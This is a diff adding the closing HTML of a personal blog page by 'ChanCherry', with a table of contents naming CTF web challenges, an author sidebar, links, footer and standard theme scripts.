+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web2"><span class="nav-number">1.</span> <span class="nav-text">web2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#计算器"><span class="nav-number">2.</span> <span class="nav-text">计算器</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web基础-GET"><span class="nav-number">3.</span> <span class="nav-text">web基础$_GET</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#矛盾"><span class="nav-number">4.</span> <span class="nav-text">矛盾</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web3"><span class="nav-number">5.</span> <span class="nav-text">web3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#域名解析"><span class="nav-number">6.</span> <span class="nav-text">域名解析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#你必须让它停下"><span class="nav-number">7.</span> <span class="nav-text">你必须让它停下</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#本地包含"><span class="nav-number">8.</span> <span class="nav-text">本地包含</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#变量1"><span class="nav-number">9.</span> <span class="nav-text">变量1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web5"><span class="nav-number">10.</span> <span class="nav-text">web5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#头等舱"><span class="nav-number">11.</span> <span class="nav-text">头等舱</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#网站被黑"><span class="nav-number">12.</span> <span class="nav-text">网站被黑</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#管理员系统"><span class="nav-number">13.</span> <span class="nav-text">管理员系统</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web4"><span class="nav-number">14.</span> <span class="nav-text">web4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#flag在index里"><span class="nav-number">15.</span> <span class="nav-text">flag在index里</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#点击一百万次"><span class="nav-number">16.</span> <span class="nav-text">点击一百万次</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#备份是个好习惯"><span class="nav-number">17.</span> <span class="nav-text">备份是个好习惯</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#输入密码查看flag"><span class="nav-number">18.</span> <span class="nav-text">输入密码查看flag</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#秋名山老司机"><span class="nav-number">19.</span> <span class="nav-text">秋名山老司机</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#速度要快"><span class="nav-number">20.</span> <span class="nav-text">速度要快</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cookies欺骗"><span class="nav-number">21.</span> <span class="nav-text">cookies欺骗</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#never-give-up"><span class="nav-number">22.</span> <span class="nav-text">never give up</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ChanCherry"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">ChanCherry</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">49</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ChanCherry" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ChanCherry" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://me.csdn.net/ITmincherry" title="CSDN → https:&#x2F;&#x2F;me.csdn.net&#x2F;ITmincherry" rel="noopener" target="_blank"><i class="fa fa-fw fa-adjust"></i>CSDN</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.zhihu.com/people/chancherry" title="知乎 → https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;chancherry" rel="noopener" target="_blank"><i class="fa fa-fw fa-bell"></i>知乎</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/ChanCherry" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;ChanCherry" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://120.79.189.7/" title="http:&#x2F;&#x2F;120.79.189.7&#x2F;" rel="noopener" target="_blank">郁离歌</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.leavesongs.com/" title="https:&#x2F;&#x2F;www.leavesongs.com&#x2F;" rel="noopener" target="_blank">离别歌</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+	  
+	  <div id="music163player">
+			<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=28312036&auto=1&height=66">
+			</iframe>
+	  </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ChanCherry</span>
+</div>
+
+<div class="theme-info">
+  <div class="powered-by">
+	<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+	本站访客数:<span id="busuanzi_value_site_uv"></span>
+	</span>
+  </div>
+  <span class="post-count">博客全站共50.9k字</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+
+  
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/fireworks.js"></script>
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
